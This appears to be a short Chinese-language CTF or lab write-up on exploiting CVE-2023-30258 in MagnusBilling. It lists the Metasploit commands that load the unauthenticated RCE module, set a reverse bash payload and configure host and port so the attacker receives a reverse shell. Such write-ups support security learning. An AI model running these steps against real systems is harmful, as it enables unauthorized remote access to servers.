---
icon: pen-to-square
date: 2025-03-26
tags: 
title: billing
category:
  - 项目
---
## 1. 前言
本题运用了简单的[CVE-2023-30258](https://eldstal.se/advisories/230327-magnusbilling.html)漏洞，这是一个简单的远程命令执行漏洞
## 2. 复现步骤
这个漏洞已经在msf中收录了
`msfconsole`

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png)

```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110506.png)

```bash
show targets
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110536.png)

```bash
set PAYLOAD cmd/unix/reverse_bash
```
设置payload，然后设置Rhost Rport Lhost以及Lport
设置好监听接口以及payload之后，msf会自动接收反向shell
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112352.png)
